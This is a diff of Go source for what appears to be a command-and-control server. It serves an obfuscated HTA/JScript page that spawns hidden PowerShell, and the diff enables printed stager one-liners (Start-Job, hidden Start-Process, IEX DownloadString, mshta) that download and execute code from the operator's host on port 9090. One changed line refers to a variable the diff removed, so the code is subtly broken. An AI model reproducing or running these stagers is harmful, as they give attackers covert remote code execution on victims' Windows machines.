@@ -45,7 +45,7 @@ var (
 	session_id                               string = ""
 	Host                                     string = ""
 	back                                     string = ""
-	code string =`
+	code                                     string = `
 <html>
 <head>
 <script language="JScript">
@@ -130,7 +130,7 @@ func replace(web_data string) string {
 	data := reg.ReplaceAllString(web_data, "+")
 	return data
 }
-func str_replace(data string,reg_str string,str string) string {
+func str_replace(data string, reg_str string, str string) string {
 	reg, _ := regexp.Compile(reg_str)
 	str_data := reg.ReplaceAllString(data, str)
 	return str_data
@@ -240,7 +240,7 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 			fmt.Fprintln(w, payload)
 		}
 	} else if url_hjf.MatchString(r.URL.Path) {
-		js :=  `
+		js := `
 
 var cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring('http://{ip}:{port}/get'));";
 var w32ps= GetObject('winmgmts:').Get('Win32_ProcessStartup');
@@ -248,28 +248,28 @@ w32ps.SpawnInstance_();
 w32ps.ShowWindow=0;
 var rtrnCode=GetObject('winmgmts:').Get('Win32_Process').Create(cm,'c:\\',w32ps,null);
 `
-		js = str_replace(js,`{ip}`,"192.168.1.3",)
-		js = str_replace(js,`{port}`,"9090",)
+		js = str_replace(js, `{ip}`, Host)
+		js = str_replace(js, `{port}`, "9090")
 		js = base64.StdEncoding.EncodeToString([]byte(js))
-		js = str_replace(js,`\n`,"",)
+		js = str_replace(js, `\n`, "")
 		reg := map[string]string{
-			"]":"=",
-			"[":"a",
-			",":"b",
-			"@":"D",
-			"-":"x",
-			"~":"N",
-			"*":"E",
-			"%":"C",
-			"$":"H",
-			"!":"G",
-			"{":"K",
-			"}":"O",
+			"]": "=",
+			"[": "a",
+			",": "b",
+			"@": "D",
+			"-": "x",
+			"~": "N",
+			"*": "E",
+			"%": "C",
+			"$": "H",
+			"!": "G",
+			"{": "K",
+			"}": "O",
 		}
-		for k,v:=range reg {
-			js = str_replace(js,v,k)
+		for k, v := range reg {
+			js = str_replace(js, v, k)
 		}
-		code=strings.Replace(code, `{code}`,js ,1 )
+		code = strings.Replace(code, `{code}`, js, 1)
 		//fmt.Print(code)
 		fmt.Fprint(w, code)
 	} else {
@@ -334,47 +334,46 @@ func Hosts() {
 	fmt.Printf("%s %s \n", Blue("[☠ ]"), command)
 	fmt.Println("\n")
 
-	command = "mshta "+Host+":9090/hjf"
+	command = "mshta http://" + Host + ":9090/hjf"
 	fmt.Printf("%s %s \n", Blue("[☠ ]"), command)
 	fmt.Println("\n")
 
+	//---------------------------------------------------------------
+	payload_JOB := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"
 
-	////---------------------------------------------------------------
-	//payload := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"
-	//
-	//strbytes := []byte(payload)
-	//encoded := base64.StdEncoding.EncodeToString(strbytes)
-	////---------------------------------------------------------------
-	//commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
-	////commandF = commandJ
-	//fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB Payload+---")
-	//fmt.Printf("%s %s \n", Blue("[☠ ]"), commandJ)
-	//fmt.Println("\n")
-	////---------------------------------------------------------------
-	//commandP := "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
-	//fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell New Process Payload+---")
-	//fmt.Printf("%s %s \n", Blue("[☠ ]"), commandP)
-	//fmt.Println("\n")
-	////---------------------------------------------------------------
-	//commandF_IP := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/hjf');IEX($s)"
-	//commandF_strbytes := []byte(commandF_IP)
-	//commandF_encoded := base64.StdEncoding.EncodeToString(commandF_strbytes)
-	//commandF := "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + commandF_encoded + "')))"
-	//fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB + File Payload+---")
-	//fmt.Printf("%s %s \n", Blue("[☠ ]"), commandF)
-	//fmt.Println("\n")
-	////---------------------------------------------------------------
-	//simple_payload := "powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');Invoke-Expression $h;\""
-	//
-	//simple_payload2 := "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
-	//simple_payload3 := "powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
-	//fmt.Printf("%s %s \n", Blue("[*]"), "---+ Powershell simple payloads +---")
-	//fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload)
-	//fmt.Println("\n")
-	//fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload2)
-	//fmt.Println("\n")
-	//fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload3)
-	//fmt.Println("\n")
+	strbytes_JOB := []byte(payload_JOB)
+	encoded_JOB := base64.StdEncoding.EncodeToString(strbytes_JOB)
+	//---------------------------------------------------------------
+	commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded_JOB + "')))}"
+	//commandF = commandJ
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB Payload+---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandJ)
+	fmt.Println("\n")
+	//---------------------------------------------------------------
+	commandP := "Start-Process powershell -ArgumentList " + "\"iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))\"" + " -WindowStyle Hidden"
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell New Process Payload+---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandP)
+	fmt.Println("\n")
+	//---------------------------------------------------------------
+	commandF_IP := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/hjf');IEX($s)"
+	commandF_strbytes := []byte(commandF_IP)
+	commandF_encoded := base64.StdEncoding.EncodeToString(commandF_strbytes)
+	commandF := "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + commandF_encoded + "')))"
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+Powershell JOB + File Payload+---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), commandF)
+	fmt.Println("\n")
+	//---------------------------------------------------------------
+	simple_payload := "powershell -w hidden \"$h = (New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');Invoke-Expression $h;\""
+
+	simple_payload2 := "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
+	simple_payload3 := "powershell -w hidden \"Invoke-Expression(New-Object Net.WebClient).DownloadString('http://" + Host + ":9090/get');\""
+	fmt.Printf("%s %s \n", Blue("[*]"), "---+ Powershell simple payloads +---")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload)
+	fmt.Println("\n")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload2)
+	fmt.Println("\n")
+	fmt.Printf("%s %s \n", Blue("[☠ ]"), simple_payload3)
+	fmt.Println("\n")
 }
 
 //---------------------------------------------------------------
